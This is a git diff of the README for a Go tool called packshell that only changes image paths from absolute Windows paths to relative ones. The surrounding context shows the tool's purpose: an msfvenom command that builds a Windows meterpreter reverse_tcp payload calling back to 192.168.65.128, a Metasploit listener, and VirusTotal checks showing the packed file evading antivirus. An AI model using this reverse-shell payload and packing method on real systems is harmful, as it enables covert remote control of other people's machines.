@@ -37,7 +37,7 @@ go build -o packer.exe .\cmd\packer.go
 
 # Detail
 
-![detail](D:\goProjects\packshell\images\detail.jpg)
+![detail](./images/detail.jpg)
 
 # Test
 
@@ -51,7 +51,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.65.128 lport=9999 
 
 - msf create a listener
 
-![msf](D:\goProjects\packshell\images\msf.png)
+![msf](./images/msf.png)
 
 - use our project packshell create a new file
 
@@ -63,17 +63,17 @@ packer.exe win_normal.exe win_pack.exe
 
 - execute new file and msf get a session
 
-![session](D:\goProjects\packshell\images\session.png)
+![session](./images/session.png)
 
 ## anti-virus test
 
 - unpack file in virustotal
 
-![unpack](D:\goProjects\packshell\images\unpack.png)
+![unpack](./images/unpack.png)
 
 - packed file in virustotal
 
-![packed](D:\goProjects\packshell\images\packed.png)
+![packed](./images/packed.png)
 
 # TODO
 
